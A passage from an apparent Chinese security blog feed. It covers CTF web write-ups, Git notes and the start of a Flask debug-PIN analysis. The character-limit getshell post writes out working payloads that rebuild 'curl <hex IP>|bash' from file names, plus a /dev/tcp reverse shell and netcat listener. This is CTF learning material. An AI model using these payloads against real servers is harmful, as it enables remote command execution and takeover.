src="/2020/04/22/hfctf-web/sess_sha256.jpg"><p>上传该 sess 文件</p><img src="/2020/04/22/hfctf-web/upload.jpg"><p>然后将 PHPSESSID 改为上面计算的 SHA256 值即可</p><p>下一步就是怎么创建 success.txt，直接上传的话文件名后会包含 SHA256 值，但是根据 file_exists 的函数描述，它是检查文件或目录是否存在，我们不好直接上传文件，但是可以创建目录</p><img src="/2020/04/22/hfctf-web/success.jpg"><p>刷新页面即可获得 flag</p><h2 id="0x04-完结撒花"><a href="#0x04-完结撒花" class="headerlink" title="0x04 完结撒花"></a>0x04 完结撒花</h2><p>一共三道 WEB 有两道 nodejs 着实没想到，对 nodejs 一点都不熟悉，总结一下，还是太菜了</p><p>以后要多看看这一类的题，要不然比赛遇到了无从下手就很难受</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过字符数限制 getshell</title>
      <link href="/2020/04/18/bypass-char-number-limit/"/>
      <url>/2020/04/18/bypass-char-number-limit/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前做题有做到过字数限制的 shell，有五个字符也有四个字符的，当然我一直不会做，最近又重新研究了一下这个绕过的问题，就把它记录下来了</p><p>这种题一般都是每人一个 sandbox 目录，之后的操作都在这个目录中进行</p><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><ol><li><p><code>ls</code> 输出的默认排序是逐字符按照 ASCII 码从小到大排序</p></li><li><p><code>ls -t</code> 文件名按时间排序</p></li><li><p>重定向符 <code>&gt;</code> 无命令也可用于创建文件</p></li><li><p>IP 的等价表示（选用，有时可降低难度）</p><p>将 <code>.</code> 分隔的每个十进制数转换成两位十六进制再连接起来（可转换成十进制、八进制等），和原 IP 等价使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="string">'172.17.0.1'</span></span><br><span class="line">hex_ip = <span class="string">'0x'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>):</span><br><span class="line">    hex_ip += str(hex(int(i)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">print(hex_ip) <span class="comment"># 0xac110001</span></span><br><span class="line">print(int(hex_ip, <span class="number">16</span>)) <span class="comment"># 2886795265</span></span><br><span class="line">print(<span class="string">'0'</span> + oct(int(hex_ip, <span class="number">16</span>))[<span class="number">2</span>:]) <span class="comment"># 025404200001</span></span><br></pre></td></tr></table></figure></li><li><p>单独的 <code>*</code> 相当于 <code>`ls`</code> 即将文件名作为命令执行，也可以添加其它字符进行匹配</p><img src="/2020/04/18/bypass-char-number-limit/star.jpg" title="star"><p>如上图所示，目录下有两个文件 <code>dir</code> 和 <code>whoami</code> ，单独的 <code>*</code> 执行了 <code>dir whoami</code> 命令，而 <code>*i</code> 执行了 <code>whoami</code> 命令</p></li><li><p><code>dir</code> 命令本质上与 <code>ls</code> 相同，但输出不换行，且首字母为 d 可以操作</p></li><li><p><code>rev</code> 命令输出反转文件每一行后的内容</p><img src="/2020/04/18/bypass-char-number-limit/rev.jpg" title="rev"></li></ol><h2 id="0x02-5个字符"><a href="#0x02-5个字符" class="headerlink" title="0x02 5个字符"></a>0x02 5个字符</h2><p>当然先是五个字符的，简单一点</p><p>题目代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/tmp/sandbox5/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span>.$sandbox.<span class="string">'/*'</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>大体思路就是把 <code>curl ip|bash</code> 分割成一个一个小字符串，并在结尾添加 <code>\</code> 连接，将要执行的脚本放在服务器上，这其中还要用到 <code>ls -t</code> ，为了防止 <code>.</code> 的干扰采用十六进制表示 IP (这里需要自己研究怎么分割)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls -t&gt;v</span></span><br><span class="line">&gt;ls\\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;v</span><br><span class="line">ls&gt;&gt;_</span><br><span class="line"><span class="comment"># curl 0xac110001|bash (适当分割并逆序写入)</span></span><br><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;01\\</span><br><span class="line">&gt;00\\</span><br><span class="line">&gt;11\\</span><br><span class="line">&gt;ac\\</span><br><span class="line">&gt;0x\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line"><span class="comment"># exec</span></span><br><span class="line">sh _</span><br><span class="line">sh v</span><br></pre></td></tr></table></figure><p>服务器中 <code>index.html</code> 中放有反弹 shell 的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在服务器监听 <code>12345</code> 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 12345</span><br></pre></td></tr></table></figure><p>成功反弹 shell</p><h2 id="0x02-5-一个惊喜的发现"><a href="#0x02-5-一个惊喜的发现" class="headerlink" title="0x02.5 一个惊喜的发现"></a>0x02.5 一个惊喜的发现</h2><p>我在做 4 个字符的测试时发现，用 php 的 <code>exec</code> 函数执行 shell 命令，结尾的反斜杠居然不需要转义</p><p>即上一题的 payload 可简化为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls -t&gt;v</span></span><br><span class="line">&gt;ls\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;-t\</span><br><span class="line">&gt;\&gt;v</span><br><span class="line">ls&gt;&gt;_</span><br><span class="line"><span class="comment"># curl 0xac110001|bash (适当分割并逆序写入)</span></span><br><span class="line">&gt;bash</span><br><span class="line">&gt;1\|\</span><br><span class="line">&gt;000\</span><br><span class="line">&gt;c11\</span><br><span class="line">&gt;0xa\</span><br><span class="line">&gt;l\ \</span><br><span class="line">&gt;cur\</span><br><span class="line"><span class="comment"># exec</span></span><br><span class="line">sh _</span><br><span class="line">sh v</span><br></pre></td></tr></table></figure><p>也成功反弹了 shell，不知道是不是个例或者是 php 版本问题，但我在接下来 4 个字符的操作中使用到了这个特性，要是有 dalao 发现这样不可行烦请告知我（如果真的有 dalao 看的话</p><h2 id="0x03-4个字符"><a href="#0x03-4个字符" class="headerlink" title="0x03 4个字符"></a>0x03 4个字符</h2><p>这才是重头戏，曾经差点把我搞自闭的题，我终于做出来了</p><p>题目代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/tmp/sandbox4/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span>.$sandbox.<span class="string">'/*'</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>思路与之前相同，但是要充分运用 <code>dir</code> 和 <code>rev</code> 命令，先放一下 payload 再进行分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls -tk&gt;f</span></span><br><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;kt-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v <span class="comment"># 这里文件名为 v 非常重要</span></span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;g</span><br><span class="line"><span class="comment"># curl 0xac110001|bash (适当分割并逆序写入)</span></span><br><span class="line">&gt;ash</span><br><span class="line">&gt;b\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;01\</span><br><span class="line">&gt;00\</span><br><span class="line">&gt;11\</span><br><span class="line">&gt;ac\</span><br><span class="line">&gt;0x\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line"><span class="comment"># exec</span></span><br><span class="line">sh g</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>这里重点分析第一部分，怎么奇特的构造出需要的命令</p><p>第一步创建名为 dir 的文件，由于 d 的 ASCII 码较小，这个文件在第一部分将始终位于第一位</p><p>第二三四步分别创建对应文件</p><p>第五步用到了单独的 <code>*</code> 这里相当于执行了 <code>`dir f&gt; kt- sl`&gt;v</code></p><p>这之后文件 v 中的内容为 <code>f&gt; kt- sl</code></p><p>第六步创建名为 rev 的文件</p><p>第七步是这里最重要的地方，也是前边的文件名为 v 非常重要的原因，用到了 <code>*</code> 第二种用法，相当于执行了 <code>`rev v`&gt;g</code> ，即将 v 的内容反转写入 g</p><p>这之后文件 g 的内容为 <code>ls -kt &gt;f</code> 之后的内容与 5 个字符的方法相同</p><p>这里再解释两个地方</p><ol><li><p>是文件名 f 可以修改，但要保证其位于第二位</p></li><li><p>是 <code>-tk</code> 中的 k 对输出结果没有影响，但控制了该文件在输出中的位置，也可进行修改，但要仍满足以上两点才可以</p></li></ol><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>好久没写博客了，在 npy 的提醒下来水一篇博客，也当做一个笔记，下次遇到这种题查自己博客就好了</p><p>这两道题的<a href="https://github.com/X5tar/bypass-char-number-limit" target="_blank" rel="noopener">源码</a>我放到 GitHub 了，并添加了一个文件名为 shell.php 的 webshell，方便以 www-data 用户进行一些操作（好像也没多大用</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 学习笔记</title>
      <link href="/2020/02/19/learn-git/"/>
      <url>/2020/02/19/learn-git/</url>
      
        <content type="html"><![CDATA[<h2 id="〇、获取本地仓库"><a href="#〇、获取本地仓库" class="headerlink" title="〇、获取本地仓库"></a>〇、获取本地仓库</h2><ol><li><code>git init</code> 初始化仓库</li><li><code>git clone &lt;url&gt;</code> 从远程仓库克隆（url 可采用 git、http、https 和 ssh 等协议）</li></ol><h2 id="一、本地文件修改、提交及查看等"><a href="#一、本地文件修改、提交及查看等" class="headerlink" title="一、本地文件修改、提交及查看等"></a>一、本地文件修改、提交及查看等</h2><ol><li><p><code>git status</code> 查看已跟踪文件状态（修改、新加、改名、删除等）</p></li><li><p><code>git add &lt;file&gt;</code> 追踪新文件</p></li><li><p><code>.gitignore</code> 文件中添加被忽略的文件</p><ul><li>以 <code>#</code> 开头的内容为注释，被 Git 自动忽略</li><li>可使用 Glob 表达式进行模式匹配</li><li>模式最后跟斜杠（ <code>/</code> ）表示目录</li><li>模式前加叹号（ <code>!</code> ） 表示取反</li></ul></li><li><p><code>git diff</code> 当前文件与暂存区之间的差异</p><ul><li><code>--cached</code> / <code>--staged</code> 暂存区与上次提交之间的差异</li></ul></li><li><p><code>git commit</code> 提交更改</p><ul><li><code>-m</code> 添加本次提交的说明（若无该参数将打开文本编辑器进行添加）</li><li><code>-a</code> 提交所有已暂存的文件（跳过 <code>git add</code> 过程）</li><li><code>--amend</code> 撤销最后的提交并重新提交</li></ul></li><li><p><code>git rm</code> 从 仓库（暂存区）和 工作目录 中删除</p><ul><li><code>-f</code> 强制删除（已修改并放入暂存区的文件）</li><li><code>--cached</code> 只从仓库（暂存区）中删除，保留在工作目录中</li></ul></li><li><p><code>git mv</code> 移动文件（<code>git mv oldfile newfile</code> 相当于运行以下三条命令）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv oldfile newfile</span><br><span class="line">git rm oldfile</span><br><span class="line">gie add newfile</span><br></pre></td></tr></table></figure></li><li><p><code>git log</code> 查看提交历史</p><ul><li><p><code>-p</code> 显示每次提交的内容差异</p></li><li><p><code>-&lt;X&gt;</code> (X 为数字) 只显示最近 X 次提交</p></li><li><p><code>--stat</code> 仅显示简要的增改行数统计</p></li><li><p><code>--pretty=</code> 指定显示的格式</p><ul><li><p><code>oneline</code> <code>short</code> <code>full</code> <code>fuller</code> 调整展示信息的多少</p></li><li><p><code>format:&quot;&quot;</code> 自定义要显示的格式（可使用如下占位符）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%H 提交对象（commit）的完整哈希字串</span><br><span class="line">%h 提交对象的简短哈希字串</span><br><span class="line">%T 树对象（tree）的完整哈希字串</span><br><span class="line">%t 树对象的简短哈希字串</span><br><span class="line">%P 父对象（parent）的完整哈希字串</span><br><span class="line">%p 父对象的简短哈希字串</span><br><span class="line">%an 作者（author）的名字</span><br><span class="line">%ae 作者的电子邮件地址</span><br><span class="line">%ad 作者修订日期（可以用 -date&#x3D; 选项定制格式）</span><br><span class="line">%ar 作者修订日期，按多久以前的方式显示</span><br><span class="line">%cn 提交者(committer)的名字</span><br><span class="line">%ce 提交者的电子邮件地址</span><br><span class="line">%cd 提交日期</span><br><span class="line">%cr 提交日期，按多久以前的方式显示</span><br><span class="line">%s 提交说明</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>--graph</code> 用图形表示所在分支及合并历史</p></li><li><p><code>--relative-date</code> 使用相对时间表示</p></li><li><p><code>--name-only</code> 仅显示新增、修改、删除的文件的文件名</p></li><li><p><code>--name-status</code> 显示新增、修改、删除的文件的文件名和执行的操作（A D M）</p></li><li><p><code>--abbrev-commit</code> 仅显示 SHA-1 的前几个字符</p></li><li><p><code>--shortstat</code> 仅显示总的行数修改统计（不显示单文件的变化）</p></li><li><p><code>--since=</code> <code>--after=</code> 仅显示指定时间后的提交</p></li><li><p><code>--until=</code> <code>--before=</code> 仅显示指定时间之前的提交</p></li><li><p><code>--author=</code> 仅显示指定作者的提交</p></li><li><p><code>--committer=</code> 仅显示指定提交者的提交</p></li><li><p><code>--no-merges</code> 排除来自合并的提交</p></li><li><p><code>--merges</code> 只显示来自合并的提交</p></li><li><p><code>--grep=</code> 匹配提交信息中的关键字</p></li><li><p>最后单独的 <code>--</code> 后的所有内容为限定的路径或文件名</p></li></ul></li><li><p><code>git reset HEAD &lt;file&gt;</code> 取消对文件的暂存</p></li><li><p><code>git checkout -- &lt;file&gt;</code> 取消对文件的修改（仅限于修改后未暂存的文件）</p></li></ol><h2 id="二、本地与远程仓库之间的操作"><a href="#二、本地与远程仓库之间的操作" class="headerlink" title="二、本地与远程仓库之间的操作"></a>二、本地与远程仓库之间的操作</h2><ol><li><code>git remote</code> 列出所有远程库的名字<ul><li><code>-v</code> <code>--verbose</code> 显示对应的地址</li><li><code>add &lt;shortname&gt; &lt;url&gt;</code> 添加新的远程仓库</li><li><code>show &lt;remote-name&gt;</code> 查看某个远程仓库的详细信息</li><li><code>rename &lt;old-name&gt; &lt;new-name&gt;</code> 修改远程仓库在本地的简称</li><li><code>rm &lt;remote-name&gt;</code> 移除某个远程仓库</li></ul></li><li><code>git fetch &lt;remote-name&gt;</code> 拉取远程仓库有但本地没有的数据（不合并）</li><li><code>git pull</code> 拉取跟踪的远程仓库对应分支的数据并合并</li><li><code>git push &lt;remote-name&gt; &lt;branch-name&gt;</code> 将本地的某分支推送到远程仓库（默认为 origin master）</li></ol><h2 id="三、标签有关操作"><a href="#三、标签有关操作" class="headerlink" title="三、标签有关操作"></a>三、标签有关操作</h2><ol><li><code>git tag</code> 列出现有标签<ul><li><code>-l &#39;&#39;</code> 模式搜索符合条件的标签</li><li><code>-a &lt;tag-name&gt; [SHA-1]</code> 添加（补加）含附注的标签</li><li><code>-s &lt;tag-name&gt;</code> 同上添加标签并用 GPG 签署标签</li><li><code>-m</code> 标签的附注说明</li><li><code>&lt;tag-name&gt;</code> 添加轻量级标签（无需附注）</li><li><code>-v &lt;tag-name&gt;</code> 验证已签署的标签</li></ul></li><li><code>git show &lt;tag-name&gt;</code> 查看相应标签的版本信息</li><li><code>git push &lt;remote-name&gt; &lt;tag-name&gt;</code> 将本地的某标签推送到远程仓库<ul><li><code>--tags</code> 推送所有本地新增的标签</li></ul></li></ol><h2 id="四、分支有关操作"><a href="#四、分支有关操作" class="headerlink" title="四、分支有关操作"></a>四、分支有关操作</h2><ol><li><p><code>git branch</code> 列出所有分支和当前指向分支</p><ul><li><code>&lt;branch-name&gt;</code> 创建新分支</li></ul></li><li><p><code>git checkout</code></p><ul><li><p><code>&lt;branch-name&gt;</code> 切换到某分支</p></li><li><p><code>-b &lt;branch-name&gt;</code> 创建并切换到分支（相当于一下两条命令）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch &lt;branch-name&gt;</span><br><span class="line">git checkout &lt;branch-name&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>-b &lt;branch-name&gt; &lt;remote-name&gt;/&lt;remote-branch&gt;</code> 从远程分支创建分支并跟踪</p></li><li><p><code>--track &lt;remote-name&gt;/&lt;remote-branch&gt;</code> 从远程分支创建<strong>同名</strong>分支并跟踪</p></li><li><p><code>-d &lt;branch-name&gt;</code> 删除某分支</p></li><li><p><code>-v</code> 显示每个分支最后一次提交的信息</p></li></ul></li><li><p><code>git merge &lt;branch-name&gt;</code> 将某分支合并到当前分支（可能出现冲突需要<strong>手动处理</strong>）</p></li><li><p><code>git push &lt;remote-name&gt; &lt;branch-name&gt;:&lt;remote-branch&gt;</code> 将本地分支推送到命名不同的远程分支（本地分支留空推送空分支，即为删除远程分支）</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 Flask Debug PIN 的安全性问题</title>
      <link href="/2019/11/26/flask-debug-pin/"/>
      <url>/2019/11/26/flask-debug-pin/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上周打南邮的 NCTF 时碰到了一道名为 flask_website 的题，刚开始想的是模板注入，但发现没有注入点，后来点到页面最下边的一个链接，跳转到了 Debug 模式的报错界面，从此处了解到 Flask Debug PIN 的存在，这个利用可能比较鸡肋，但倒是挺有趣的</p><h2 id="0x01-Flask-Debug-模式"><a href="#0x01-Flask-Debug-模式" class="headerlink" title="0x01 Flask Debug 模式"></a>0x01 Flask Debug 模式</h2><p>只需要在 <code>app.run()</code> 的参数中添加 <code>debug=True</code> 即可开启 Debug 模式，此时出现错误将呈现错误信息，在报错界面可使用 <code>Flask Debug PIN</code> 直接调用 Python console ，这里只需获取 PIN 即可 getshell</p><h2 id="0x02-源码分析"><a href="#0x02-源码分析" class="headerlink" title="0x02 源码分析"></a>0x02 源码分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python所在目录/Lib/site-packages/werkzeug/debug/__init__.py</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_machine_id</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line">    rv = _machine_id</span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment"># docker containers share the same machine id, get the</span></span><br><span class="line">        <span class="comment"># container id instead</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/proc/self/cgroup"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                value = f.readline()</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = value.strip().partition(<span class="string">"/docker/"</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Potential sources of secret information on linux.  The machine-id</span></span><br><span class="line">        <span class="comment"># is stable across boots, the boot id is not</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">"/etc/machine-id"</span>, <span class="string">"/proc/sys/kernel/random/boot_id"</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(filename, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X we can use the computer's serial number assuming that</span></span><br><span class="line">        <span class="comment"># ioreg exists and can spit out that information.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Also catch import errors: subprocess may not be available, e.g.</span></span><br><span class="line">            <span class="comment"># Google App Engine</span></span><br><span class="line">            <span class="comment"># See https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">            dump = Popen(</span><br><span class="line">                [<span class="string">"ioreg"</span>, <span class="string">"-c"</span>, <span class="string">"IOPlatformExpertDevice"</span>, <span class="string">"-d"</span>, <span class="string">"2"</span>], stdout=PIPE</span><br><span class="line">            ).communicate()[<span class="number">0</span>]</span><br><span class="line">            match = re.search(<span class="string">b'"serial-number" = &lt;([^&gt;]+)'</span>, dump)</span><br><span class="line">            <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">        <span 